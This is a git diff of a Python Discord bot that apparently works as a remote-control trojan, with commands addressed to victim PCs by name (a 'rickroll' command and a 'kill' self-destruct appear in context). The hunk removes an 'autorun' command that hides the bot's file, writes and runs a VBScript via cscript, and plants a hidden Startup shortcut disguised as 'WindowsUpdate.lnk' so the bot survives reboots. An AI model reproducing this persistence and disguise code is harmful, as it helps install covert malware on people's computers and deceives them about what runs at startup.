@@ -1029,45 +1029,6 @@ async def rickroll(ctx, pc_name: str):
     except Exception as e:
         await ctx.send(f"❌ Error: {str(e)}")
 
-@bot.command(name="autorun")
-async def hide_bot(ctx, pc_name: str):
-    """Hide the bot file and create startup shortcut (!hidebot PC-Name)"""
-    if pc_name.lower() != get_pc_name():
-        return
-
-    try:
-
-        bot_path = os.path.abspath(sys.argv[0])
-        startup_folder = os.path.join(
-            os.getenv('APPDATA'),
-            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-        )
-        
-        ctypes.windll.kernel32.SetFileAttributesW(bot_path, 2) 
-        
-
-        shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
-        
-        vbs_script = f"""
-        Set oWS = WScript.CreateObject("WScript.Shell")
-        Set oLink = oWS.CreateShortcut("{shortcut_path}")
-        oLink.TargetPath = "{bot_path}"
-        oLink.WorkingDirectory = "{os.path.dirname(bot_path)}"
-        oLink.Save
-        """
-        
-        vbs_file = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
-        with open(vbs_file, "w") as f:
-            f.write(vbs_script)
-        
-        subprocess.run(['cscript.exe', '//B', '//Nologo', vbs_file], check=True)
-        ctypes.windll.kernel32.SetFileAttributesW(shortcut_path, 2)
-        os.remove(vbs_file)
-        
-        await ctx.send("✅ Bot file hidden and startup shortcut created!")
-    except Exception as e:
-        await ctx.send(f"❌ Error: {str(e)}")
-        print(f"[HIDEBOT ERROR] {traceback.format_exc()}")
 
 @bot.command(name="kill")
 async def self_destruct(ctx, pc_name: str):
